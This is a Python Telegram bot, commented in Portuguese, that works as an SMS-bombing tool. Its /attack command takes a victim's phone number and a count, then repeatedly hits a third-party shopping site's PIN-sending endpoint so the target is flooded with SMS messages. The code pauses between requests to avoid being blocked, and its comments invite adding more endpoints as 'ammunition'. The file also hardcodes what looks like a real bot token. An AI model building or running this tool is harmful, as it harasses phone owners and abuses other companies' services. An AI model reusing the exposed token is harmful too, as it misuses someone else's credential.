import telebot
import requests
import threading
import time

# --- CONFIGURAÇÕES ---
TOKEN = "8678290317:AAHrFP3IXWtreQhumMgAn9642HcTPTof8tI"
bot = telebot.TeleBot(TOKEN)

# Lista de APIs (Munição)
# Adicionei o Torob. Se achar mais links, é só colocar aqui entre aspas e com vírgula.
API_LIST = [
    "https://api.torob.com/a/phone/send-pin/?phone_number="
]

def attack_loop(phone, count):
    success = 0
    fail = 0
    
    for i in range(count):
        for url in API_LIST:
            try:
                # Faz o disparo do SMS
                response = requests.get(f"{url}{phone}", timeout=5)
                if response.status_code == 200:
                    success += 1
                else:
                    fail += 1
            except:
                fail += 1
        
        # Pequena pausa para não ser bloqueado instantaneamente pelo servidor
        time.sleep(1)
    
    return success, fail

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Bot Ativo. Use: /attack [numero] [quantidade]\nExemplo: /attack 5511999999999 50")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    try:
        # Divide a mensagem: /attack numero quantidade
        args = message.text.split()
        phone = args[1]
        count = int(args[2])
        
        bot.reply_to(message, f"🚀 Iniciando ataque em {phone}...\nQuantidade: {count} disparos por API.")
        
        # Roda o ataque em uma thread separada para não travar o bot
        def run():
            s, f = attack_loop(phone, count)
            bot.send_message(message.chat.id, f"✅ Ataque Finalizado!\n\nSucessos: {s}\nFalhas: {f}")
        
        threading.Thread(target=run).start()
        
    except Exception as e:
        bot.reply_to(message, "❌ Erro! Use o formato: /attack 5511999999999 50")

print("Bot rodando...")
bot.infinity_polling()
